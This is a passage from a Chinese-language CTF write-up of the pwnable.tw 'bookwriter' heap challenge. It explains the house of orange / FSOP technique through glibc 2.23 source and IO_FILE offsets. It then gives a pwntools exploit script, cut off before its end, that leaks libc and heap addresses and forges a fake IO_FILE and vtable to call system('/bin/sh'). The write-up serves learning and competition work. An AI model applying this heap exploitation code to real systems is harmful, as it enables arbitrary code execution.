&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">leakheap = u64(rcl().strip().ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heapbase = leakheap - <span class="number">0x10</span></span><br><span class="line">sla(<span class="string">b&#x27;Do you want to change the author ? (yes:1 / no:0) &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">NAUPINFO(<span class="string">&#x27;LEAKLIBC&#x27;</span>,<span class="built_in">hex</span>(leaklibc))</span><br><span class="line">NAUPINFO(<span class="string">&#x27;LIBCBASE&#x27;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line">NAUPINFO(<span class="string">&#x27;LEAKHEAP&#x27;</span>,<span class="built_in">hex</span>(leakheap))</span><br><span class="line">NAUPINFO(<span class="string">&#x27;HEAPBASE&#x27;</span>,<span class="built_in">hex</span>(heapbase))</span><br><span class="line"><span class="comment">### interactive</span></span><br><span class="line">ita()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>因為沒有free，就繼續打house of orange<br>來回顧一下house of orange</p>
+<h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h3><p>首先是先了解unsorted bin attack<br>可以參考Pwn-heap note 1的部分<br><a target="_blank" rel="noopener" href="https://hackmd.io/4fsviCDBQqG_aTIeq1fcMw?view#unsorted-bin-attack">https://hackmd.io/4fsviCDBQqG_aTIeq1fcMw?view#unsorted-bin-attack</a></p>
+<h3 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="IO_FILE"></a>IO_FILE</h3><p>先來關注malloc_printerr<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L4987">https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L4987</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">malloc_printerr</span> <span class="params">(<span class="type">int</span> action, <span class="type">const</span> <span class="type">char</span> *str, <span class="type">void</span> *ptr, mstate ar_ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Avoid using this arena in future.  We do not attempt to synchronize this</span></span><br><span class="line"><span class="comment">     with anything else because we minimally want to ensure that __libc_message</span></span><br><span class="line"><span class="comment">     gets its resources safely without stumbling on the current corruption.  */</span></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr)</span><br><span class="line">    set_arena_corrupt (ar_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((action &amp; <span class="number">5</span>) == <span class="number">5</span>)</span><br><span class="line">    __libc_message (action &amp; <span class="number">2</span>, <span class="string">&quot;%s\n&quot;</span>, str);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (action &amp; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> buf[<span class="number">2</span> * <span class="keyword">sizeof</span> (<span class="type">uintptr_t</span>) + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">      buf[<span class="keyword">sizeof</span> (buf) - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">      <span class="type">char</span> *cp = _itoa_word ((<span class="type">uintptr_t</span>) ptr, &amp;buf[<span class="keyword">sizeof</span> (buf) - <span class="number">1</span>], <span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">while</span> (cp &gt; buf)</span><br><span class="line">        *--cp = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      __libc_message (action &amp; <span class="number">2</span>, <span class="string">&quot;*** Error in `%s&#x27;: %s: 0x%s ***\n&quot;</span>,</span><br><span class="line">                      __libc_argv[<span class="number">0</span>] ? : <span class="string">&quot;&lt;unknown&gt;&quot;</span>, str, cp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (action &amp; <span class="number">2</span>)</span><br><span class="line">    <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>他主要調用了__libc_message<br>跟進去看<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.23/source/sysdeps/posix/libc_fatal.c#L67">https://elixir.bootlin.com/glibc/glibc-2.23/source/sysdeps/posix/libc_fatal.c#L67</a></p>
+<p>這邊可以看到他最後調用了abort來kill整個process</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (do_abort)</span><br><span class="line">  &#123;</span><br><span class="line">    BEFORE_ABORT (do_abort, written, fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Kill the application.  */</span></span><br><span class="line">    <span class="built_in">abort</span> ();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>重點關注abort這裡<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.23/source/stdlib/abort.c#L50">https://elixir.bootlin.com/glibc/glibc-2.23/source/stdlib/abort.c#L50</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (stage == <span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    ++stage;</span><br><span class="line">    fflush (<span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>調用flush 實際上調用 _IO_fflush<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/iofflush.c#L31">https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/iofflush.c#L31</a><br>_IO_fflush 調用 _IO_flush_all 調用 _IO_flush_all_lockp<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/genops.c#L814">https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/genops.c#L814</a><br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/genops.c#L759">https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/genops.c#L759</a></p>
+<p>他會從 _IO_list_all 開始循環，將當前循環的fp作為<br>_IO_OVERFLOW (fp, EOF) 參數傳入</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  __libc_cleanup_region_start (do_lock, flush_cleanup, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (last_stamp != _IO_list_all_stamp)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Something was added to the list.  Start all over again.  */</span></span><br><span class="line">	  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">	  last_stamp = _IO_list_all_stamp;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	fp = fp-&gt;_chain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">  __libc_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到這裡應該可以發現如果能偽造 IO_list_all上的IO_FILE，就可以控制程式<br>另外也可以劫持 IO_list_all，來做FSOP</p>
+<p>結合前面的 unsorted bin可以在任意 address寫上一個main arena address，所以我們將 IO_list_all寫上 main arena位置，此時的main arena被當 IO_FILE(然而main arena不可控)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;amd64&#x27;</span>:&#123;</span><br><span class="line">    <span class="number">0x0</span>:<span class="string">&#x27;_flags&#x27;</span>,</span><br><span class="line">    <span class="number">0x8</span>:<span class="string">&#x27;_IO_read_ptr&#x27;</span>,</span><br><span class="line">    <span class="number">0x10</span>:<span class="string">&#x27;_IO_read_end&#x27;</span>,</span><br><span class="line">    <span class="number">0x18</span>:<span class="string">&#x27;_IO_read_base&#x27;</span>,</span><br><span class="line">    <span class="number">0x20</span>:<span class="string">&#x27;_IO_write_base&#x27;</span>,</span><br><span class="line">    <span class="number">0x28</span>:<span class="string">&#x27;_IO_write_ptr&#x27;</span>,</span><br><span class="line">    <span class="number">0x30</span>:<span class="string">&#x27;_IO_write_end&#x27;</span>,</span><br><span class="line">    <span class="number">0x38</span>:<span class="string">&#x27;_IO_buf_base&#x27;</span>,</span><br><span class="line">    <span class="number">0x40</span>:<span class="string">&#x27;_IO_buf_end&#x27;</span>,</span><br><span class="line">    <span class="number">0x48</span>:<span class="string">&#x27;_IO_save_base&#x27;</span>,</span><br><span class="line">    <span class="number">0x50</span>:<span class="string">&#x27;_IO_backup_base&#x27;</span>,</span><br><span class="line">    <span class="number">0x58</span>:<span class="string">&#x27;_IO_save_end&#x27;</span>,</span><br><span class="line">    <span class="number">0x60</span>:<span class="string">&#x27;_markers&#x27;</span>,</span><br><span class="line">    <span class="number">0x68</span>:<span class="string">&#x27;_chain&#x27;</span>,</span><br><span class="line">    <span class="number">0x70</span>:<span class="string">&#x27;_fileno&#x27;</span>,</span><br><span class="line">    <span class="number">0x74</span>:<span class="string">&#x27;_flags2&#x27;</span>,</span><br><span class="line">    <span class="number">0x78</span>:<span class="string">&#x27;_old_offset&#x27;</span>,</span><br><span class="line">    <span class="number">0x80</span>:<span class="string">&#x27;_cur_column&#x27;</span>,</span><br><span class="line">    <span class="number">0x82</span>:<span class="string">&#x27;_vtable_offset&#x27;</span>,</span><br><span class="line">    <span class="number">0x83</span>:<span class="string">&#x27;_shortbuf&#x27;</span>,</span><br><span class="line">    <span class="number">0x88</span>:<span class="string">&#x27;_lock&#x27;</span>,</span><br><span class="line">    <span class="number">0x90</span>:<span class="string">&#x27;_offset&#x27;</span>,</span><br><span class="line">    <span class="number">0x98</span>:<span class="string">&#x27;_codecvt&#x27;</span>,</span><br><span class="line">    <span class="number">0xa0</span>:<span class="string">&#x27;_wide_data&#x27;</span>,</span><br><span class="line">    <span class="number">0xa8</span>:<span class="string">&#x27;_freeres_list&#x27;</span>,</span><br><span class="line">    <span class="number">0xb0</span>:<span class="string">&#x27;_freeres_buf&#x27;</span>,</span><br><span class="line">    <span class="number">0xb8</span>:<span class="string">&#x27;__pad5&#x27;</span>,</span><br><span class="line">    <span class="number">0xc0</span>:<span class="string">&#x27;_mode&#x27;</span>,</span><br><span class="line">    <span class="number">0xc4</span>:<span class="string">&#x27;_unused2&#x27;</span>,</span><br><span class="line">    <span class="number">0xd8</span>:<span class="string">&#x27;vtable&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>offset &#x3D; 0x68的位置是 _chain，他會指向下一塊IO_FILE，如果能把它指向 heap chunk，那就可以打偽造一塊完整的 IO_FILE 來RCE<br>那要如何讓 _chain變成heap chunk address呢?<br>關注一下main arena<br><div class="img-item" data-src="https://hackmd.io/_uploads/SyLEJjDRA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SyLEJjDRA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>unsorted bin後面的 62 塊chunk均為 small bins<br>small bins 內的chunk 如下</p>
+<div class="table-responsive">
+<table class="table table-bordered table-striped">
+<thead>
+<tr>
+<th>bins</th>
+<th>chunk size(32bits)</th>
+<th>chunk size(64bits)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>2</td>
+<td>16</td>
+<td>32</td>
+</tr>
+<tr>
+<td>3</td>
+<td>24</td>
+<td>48</td>
+</tr>
+<tr>
+<td>4</td>
+<td>32</td>
+<td>64</td>
+</tr>
+<tr>
+<td>x</td>
+<td>8*x</td>
+<td>16*x</td>
+</tr>
+<tr>
+<td>63</td>
+<td>504</td>
+<td>1008</td>
+</tr>
+</tbody></table>
+<p>目前_chain 指向 main arena + 88 + 0x68 &#x3D; main arena + 0xc0 這是一個small bin，將small bin的chunk偽造，頭部改成&#x2F;bin&#x2F;sh\x00，vtable的IO_OVERFLOW改system<br>透過觸發malloc err來觸發</p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/H1i75zYAR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/H1i75zYAR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>接下來我們回到題目上<br>我要使用house of orange那我應該如何去寫unsorted bin呢<br>因為我們現在是沒有一個heap overflow可以去寫到unsorted bin的fd bk<br>觀察一下IDA跟gdb<br>會發現heap array長度是8，緊接著是size array，但是他循環了9次可以malloc，所以可以溢出寫size array，讓size變成一個很大的數字<br><div class="img-item" data-src="https://hackmd.io/_uploads/H1WdqG5C0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/H1WdqG5C0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>第一塊chunk就會有超級大的溢出<br>我們把原本top chunk變成unsorted bin的那塊prev size改為&#x2F;bin&#x2F;sh<br>size 蓋成 0x60<br>剩下的就按照house of orange蓋法，之後蓋掉vtable pointer到fake file下方，並偽造第4個為system<br>之後去處發malloc error，原本的unsorted bin那塊0x60，會進到small bin，_IO_list_all會被蓋成main arena<br>small bin 0x60會是_chain，剛好只到0x60那塊<br>malloc err在flush，就會IO_overflow(small_bin_fp(指向&#x2F;bin&#x2F;sh))</p>
+<p>-&gt; system(‘&#x2F;bin&#x2F;sh’)</p>
+<p>不過我腳本不是百分百成功，不知道為甚麼</p>
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_pwn_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_filestructure_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_fmt_lib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendlineafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcl</span>(): <span class="keyword">return</span> r.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcls</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recvlines(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcu</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.recvuntil(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ita</span>(): <span class="keyword">return</span> r.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cl</span>(): <span class="keyword">return</span> r.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tsl</span>(): <span class="keyword">return</span> time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">x64_env()</span><br><span class="line"></span><br><span class="line">REMOTE_LOCAL=<span class="built_in">input</span>(<span class="string">&quot;local?(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE_LOCAL==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    r=process(<span class="string">&#x27;./bookwriter&#x27;</span>)</span><br><span class="line">    debug_init()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:                                           </span><br><span class="line">    REMOTE_INFO=split_nc(<span class="string">&quot;nc chall.pwnable.tw 10304&quot;</span>)</span><br><span class="line"></span><br><span class="line">    REMOTE_IP=REMOTE_INFO[<span class="number">0</span>]</span><br><span class="line">    REMOTE_PORT=<span class="built_in">int</span>(REMOTE_INFO[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    r=remote(REMOTE_IP,REMOTE_PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment">### attach</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;attach?(y/n)&#x27;</span>) == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">    p_c(r,<span class="string">&#x27;b *0x400ce4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### heap I/O</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, data</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Size of page :&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Content :&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index of page :&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, data</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index of page :&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Content:&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="comment">### exploit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">sla(<span class="string">b&#x27;Author :&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x28</span> ,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0xfd1</span>))</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;222&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x0</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add(<span class="number">0x0</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">view(<span class="number">2</span>)</span><br><span class="line">rcu(<span class="string">b&#x27;Content :\n&#x27;</span>)</span><br><span class="line">leaklibc = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#print(type(leaklibc))</span></span><br><span class="line">libcbase = leaklibc - <span class="number">0x3c4188</span> </span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">rcu(<span class="string">b&#x27;Author : &#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">leakheap = u64(rcl().strip().ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heapbase = leakheap - <span class="number">0x10</span></span><br><span class="line">sla(<span class="string">b&#x27;Do you want to change the author ? (yes:1 / no:0) &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Some libc</span></span><br><span class="line">IO_list_all = libcbase + <span class="number">0x3c4520</span> </span><br><span class="line">system = libcbase + <span class="number">0x45390</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">fake_vtable = p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(system)</span><br><span class="line">fake_vtable_address = heapbase + <span class="number">0x110</span> + <span class="number">0xe0</span></span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">b&#x27;/bin/sh\00&#x27;</span> + p64(<span class="number">0x61</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(IO_list_all - <span class="number">0x10</span>) + p64(<span class="number">2</span>) + p64(<span class="number">3</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xe0</span>-<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) </span><br><span class="line">fake_file += p64(fake_vtable_address)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">5</span>+(p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>)*<span class="number">6</span>+p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">2</span>  + fake_file + fake_vtable</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Size of page :&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>).encode())</span><br><span class="line"></span><br><span 